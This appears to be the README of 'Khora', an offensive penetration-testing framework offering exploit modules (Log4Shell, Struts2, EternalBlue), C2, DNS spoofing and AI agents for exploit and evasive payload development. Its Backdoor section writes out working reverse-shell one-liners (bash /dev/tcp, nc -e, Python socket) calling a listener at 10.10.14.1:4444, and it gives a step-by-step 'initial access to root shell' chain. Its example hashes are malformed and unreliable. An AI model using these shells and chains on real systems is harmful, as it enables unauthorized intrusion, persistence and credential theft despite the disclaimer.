# Khora Security Testing Framework v2.1

**Professional Penetration Testing Suite with Advanced Attack Infrastructure**

**Created by: 2b53**

> ⚠️ **LEGAL NOTICE:** Authorized security testing only. Unauthorized access is illegal.

> ⚙️ **Current Status:** Actively under development. Core modules have been switched to real exploit delivery, and some components are currently being validated in test environments.

## Overview

Khora is an enterprise-grade penetration testing framework combining 10 specialized exploitation modules with advanced attack automation, session management, and comprehensive reporting capabilities.

**Perfect for:**
- Authorized security assessments
- Penetration testing engagements
- Red team operations
- Security research & training
- CTF competitions

---

## Features

### Core Exploitation (10 Modules)

| Module | Purpose | Capabilities |
|--------|---------|--------------|
| **nmap** | Reconnaissance | 9 scan types, vulnerability detection, service enumeration |
| **rce** | Remote Code Execution | Struts2, Log4Shell, ShellShock, SSTI, Command Injection |
| **backdoor** | Payload Generation | 8+ reverse shell variants, persistence scripts, C compilation |
| **c2** | Command & Control | HTTP stager, multi-client handler, session management |
| **eternalblue** | SMB Exploitation | MS17-010 vulnerability scanning, staged exploitation |
| **jailbreak** | Privilege Escalation | Container escapes, Linux privesc, suod abuse, compiled POCs |
| **cracker** | Password Cracking | Hashcat integration, GPU support, multi-format hashes |
| **dns_spoof** | Network Attack | DNS poisoning, domain hijacking, MITM capability |
| **sniffer** | Network Recon | Packet capture, credential detection, protocol analysis |
| **blueborne** | Bluetooth Exploit | CVE-2017-0785 L2CAP, device discovery, DoS attacks |

### Advanced Infrastructure (NEW)

**Exploitation Chains**
- Pre-built attack profiles (reconnaissance, compromise, escalation, post-exploitation, full assessment)
- Automatic dependency management between modules
- Critical module failure detection with abort capability
- Chain execution tracking and reporting

**Session Management**
- Persistent campaign tracking across reboots
- Job queue with scheduling and prioritization
- Multi-session restoration and state persistence
- Findings and compromise logging

**Advanced Reporting**
- HTML reports with risk scoring and color-coded severity
- JSON structured data for automation
- Executive summaries and comparative analysis
- Timeline visualization of exploitation steps

**AI Agent Framework (NEW)**
- 5 specialized AI agents for intelligent pentesting
- ExploitDevelopmentAgent: Custom exploit creation and testing
- VulnerabilityAssessmentAgent: Comprehensive vulnerability analysis
- PayloadGenerationAgent: Advanced payload creation with evasion
- NetworkReconAgent: Intelligent network mapping and discovery
- PostExploitationAgent: Persistence and lateral movement mastery

**Reverse Shell Arsenal (8+ variants)**
- Bash, Netcat, Python, Ruby, PHP, Perl, Meterpreter, MSFVenom
- Parameter-driven template system
- One-liner generator with listener setup

---

## Installation

### Quick Setup (60 seconds)

```bash
# Clone and setup
git clone https://github.com/username/Khora
cd Khora

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# OR
.\venv\Scripts\Activate.ps1  # Windows

# Install dependencies
pip install -r requirements.txt

# Verify installation
python3 test_khora.py
```

### Requirements

- **Python**: 3.8+
- **OS**: Linux (recommended), macOS, WSL2
- **Tools**: nmap, netcat, gcc (for compilation)
- **Dependencies**: See requirements.txt

### Prerequisites

```bash
# Linux (Debian/Ubuntu)
sudo apt update
sudo apt install python3-dev nmap netcat gcc build-essential

# macOS
brew install nmap netcat gcc

# Kali Linux (pre-installed)
python3 -m pip install -r requirements.txt --upgrade
```

---

## Quick Start

### Basic Usage

```bash
# List all available modules
python3 client.py --list

# Full security assessment (all 10 modules)
python3 client.py 192.168.1.100 10.10.14.1

# Single module execution
python3 client.py 192.168.1.100 10.10.14.1 -m nmap
python3 client.py 192.168.1.100 10.10.14.1 -m rce
python3 client.py 192.168.1.100 10.10.14.1 -m backdoor -v

# Parallel execution (8 workers)
python3 client.py 192.168.1.100 10.10.14.1 -w 8

# Generate JSON report
python3 client.py 192.168.1.100 10.10.14.1 --report json

# Verbose output
python3 client.py 192.168.1.100 10.10.14.1 -v -v
```

### Advanced Usage

```bash
# Execute pre-built exploitation chain
python3 exploit_chains.py reconnaissance 192.168.1.100 10.10.14.1

# Available profiles:
#   - reconnaissance (5-10 min): Full network scan
#   - initial_compromise (2-5 min): Get shell
#   - privilege_escalation (3-8 min): Get root
#   - post_exploitation (5-15 min): Post-compromise
#   - full_assessment (20-40 min): Complete pentest

# AI Agent execution
python3 client.py --agent exploit-dev 192.168.1.100 10.10.14.1    # Custom exploit development
python3 client.py --agent vuln-assess 192.168.1.100 10.10.14.1   # Vulnerability assessment
python3 client.py --agent payload-gen 192.168.1.100 10.10.14.1   # Payload generation
python3 client.py --agent net-recon 192.168.1.100 10.10.14.1     # Network reconnaissance
python3 client.py --agent post-exploit 192.168.1.100 10.10.14.1  # Post-exploitation

# Session management
python3 -c "
from sessions import _session_manager
sid = _session_manager.create_session('192.168.1.100', 'assessor')
print(f'Session: {sid}')
"

# Generate HTML report with findings
python3 -c "
from reporting import ExploitationReport
report = ExploitationReport('Assessment', '192.168.1.100')
report.add_finding('critical', 'RCE via Struts2', 'Apache Struts vulnerable')
report.save_report(format='html')
"
```


---

## 📚 Documentation

Complete documentation is organized in the `docs/` folder:

| Document | Purpose |
|----------|---------|
| [docs/QUICKSTART.md](docs/QUICKSTART.md) | 30-second setup & common workflows |
| [docs/QUICKREF.md](docs/QUICKREF.md) | Command-line reference & API guide |
| [docs/PAYLOADS.md](docs/PAYLOADS.md) | Payload generation & exploit guide |
| [docs/SECURITY.md](docs/SECURITY.md) | Security best practices & compliance |
| [docs/setup.md](docs/setup.md) | Detailed installation instructions |
| [docs/CHANGELOG.md](docs/CHANGELOG.md) | Version history & release notes |
| [docs/Troubleshooting.md](docs/Troubleshooting.md) | Common issues & solutions |
| [docs/README.md](docs/README.md) | Documentation index & navigation |

**⚡ Quick Navigation:**
- **Just starting?** → [QUICKSTART.md](docs/QUICKSTART.md)
- **Need commands?** → [QUICKREF.md](docs/QUICKREF.md)
- **Want payloads?** → [PAYLOADS.md](docs/PAYLOADS.md)
- **Security questions?** → [SECURITY.md](docs/SECURITY.md)
- **Having issues?** → [Troubleshooting.md](docs/Troubleshooting.md)

---

## Module Details

### Nmap (Network Reconnaissance)

```bash
# 9 scan types included:
# - quick: Fast initial scan
# - full: Comprehensive port scan
# - udp: UDP service discovery
# - vuln: Vulnerability detection
# - smb: SMB/NetBIOS enumeration
# - ssh_ftp: SSH/FTP service targeting
# - http: Web service enumeration
# - db: Database service scanning
# - os: OS fingerprinting
```

### RCE Module (Remote Code Execution)

```bash
python3 client.py 192.168.1.100 10.10.14.1 -m rce

# Exploits:
# 1. Apache Struts2 (CVE-2017-5638) - OGNL injection
# 2. Log4Shell (CVE-2021-44228) - JNDI injection
# 3. ShellShock (CVE-2014-6271) - Bash CGI
# 4. SSTI (Jinja2/Mako) - Template injection
# 5. Command Injection - OS command chaining
# 6. Java Deserialization - Gadget chain exploitation
```

### Backdoor & Reverse Shells

```bash
# Generate payload
python3 client.py 192.168.1.100 10.10.14.1 -m backdoor

# Manual one-liners:
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
nc -e /bin/bash 10.10.14.1 4444
python -c 'import socket,subprocess;s=socket.socket();s.connect(("10.10.14.1",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Listener setup:
nc -lvnp 4444  # Netcat listener
msfconsole -x "use exploit/multi/handler; set LHOST 10.10.14.1; set LPORT 4444; run"
```

### C2 Infrastructure

```bash
# Start C2 server
python3 client.py 192.168.1.100 10.10.14.1 -m c2

# Features:
# - HTTP stager on port 8080
# - TCP listener on specified port
# - Multi-client session management
# - Command history per session
# - Session listing and info commands
# - Persistence across agent restarts
```

### EternalBlue (MS17-010)

```bash
# Scan for vulnerability
nmap -p445 --script smb-vuln-ms17-010 192.168.1.100

# Exploit via Khora
python3 client.py 192.168.1.100 10.10.14.1 -m eternalblue

# Manual:
# 1. msfconsole
# 2. use exploit/windows/smb/ms17_010_eternalblue
# 3. set RHOSTS 192.168.1.100
# 4. set LHOST 10.10.14.1
# 5. exploit
```

### Privilege Escalation (Jailbreak)

```bash
# Enumerate privesc vectors
python3 client.py 192.168.1.100 10.10.14.1 -m jailbreak

# Includes:
# - Sudo -l enumeration
# - SUID binary discovery
# - Container escape (Docker, Kubernetes)
# - Kernel exploit compilation
# - GTFOBins vulnerability detection
```

### Hash Cracking

```bash
# Prepare hash file (hashes.txt):
a1f8c3d9e2b4f5a68c7d2e9f3g4h5i6j  # NTLM
5feceb66ffc86f38d952786c6d696c79d2c7  # SHA256
$krb5tgs$23$...  # Kerberos

# Run cracker
python3 client.py 192.168.1.100 10.10.14.1 -m cracker

# Features:
# - Automatic hash type detection
# - GPU acceleration (NVIDIA/AMD)
# - Multi-wordlist support
# - Performance benchmarking
```

---

## Output Structure

```
Khora/
├── results/              # Assessment results
│   ├── scan_results_*.txt
│   ├── test_results_*.json
│   └── reports/
├── logs/                 # Session logs
│   └── khora_*.log
├── exploits/             # Compiled C exploits
│   ├── dirtycow
│   └── kernel_exp
├── payloads/             # Generated shells
│   ├── reverse_shells.txt
│   └── *.elf / *.exe
├── sessions/             # Persistent sessions (NEW)
│   └── *.json
├── jobs/                 # Job queue (NEW)
│   └── *.json
└── reports/              # HTML/JSON reports (NEW)
    └── *.html / *.json
```

---

## Documentation

- [SECURITY.md](SECURITY.md) - Responsible disclosure, policies
- [setup.md](setup.md) - Installation for all platforms
- [CHANGELOG.md](CHANGELOG.md) - Version history
- [QUICKREF.md](QUICKREF.md) - Quick reference guide
- [Troubleshooting.md](Troubleshooting.md) - Common issues

---

## Common Workflows

### Reconnaissance Only (5-10 minutes)

```bash
python3 exploit_chains.py reconnaissance 192.168.1.100 10.10.14.1
```

### Initial Access to Root Shell (Speed Run)

```bash
# 1. Scan target
python3 client.py 192.168.1.100 10.10.14.1 -m nmap

# 2. Find RCE
python3 client.py 192.168.1.100 10.10.14.1 -m rce

# 3. Get shell
python3 client.py 192.168.1.100 10.10.14.1 -m backdoor

# 4. Escalate privileges
python3 client.py 192.168.1.100 10.10.14.1 -m jailbreak

# 5. Establish persistence
python3 client.py 192.168.1.100 10.10.14.1 -m c2
```

### Full Assessment (20-40 minutes)

```bash
python3 exploit_chains.py full_assessment 192.168.1.100 10.10.14.1
```

---

## Technical Details

### Architecture

- **Language**: Python 3.8+
- **Concurrency**: ThreadPoolExecutor for parallel execution
- **Networking**: Scapy (layer 2/3), Requests (HTTP)
- **Credentials**: Pycryptodome for encryption
- **Exploitation**: Metasploit framework integration

### Module Loading

All modules are dynamically loaded from the `modules/` directory. Each module must implement:
- `run(target, lhost, lport=4444)` function
- Proper exception handling
- Logging integration

### Logging

All activities logged to:
- `logs/khora_YYYYMMDD_HHMMSS.log` (file)
- Console output with severity levels

---

## Troubleshooting

### nmap not found
```bash
# Linux (Debian/Ubuntu)
sudo apt install nmap

# macOS
brew install nmap
```

### Permission denied on Linux
```bash
# Some modules require root
sudo python3 client.py 192.168.1.100 10.10.14.1
```

### Module import errors
```bash
# Reinstall dependencies
pip install -r requirements.txt --upgrade

# Verification
python3 test_khora.py
```

For more issues, see [docs/Troubleshooting.md](docs/Troubleshooting.md)

---

## Disclaimer & Legal

⚠️ **IMPORTANT: AUTHORIZED USE ONLY**

Khora is provided as-is for authorized security testing. Unauthorized access to computer systems is illegal.

- Only use on systems you own or have explicit written permission to test
- Never use against systems you don't have authorization for
- Author assumes zero responsibility for illegal activity
- Comply with all applicable laws in your jurisdiction

---

## Links

- **GitHub**: [https://github.com/username/Khora](https://github.com/username/Khora)
- **Documentation**: See [docs/](docs/) folder
- **Quick Start**: [docs/QUICKSTART.md](docs/QUICKSTART.md)
- **Security Issues**: Report via [docs/SECURITY.md](docs/SECURITY.md)
- **Troubleshooting**: [docs/Troubleshooting.md](docs/Troubleshooting.md)
- **License**: See LICENSE file

---

**Khora v2.1** | Professional Penetration Testing Framework  
**Author: 2b53** | *"Security through knowledge"*

---
*Developed with expertise and dedication by 2b53*
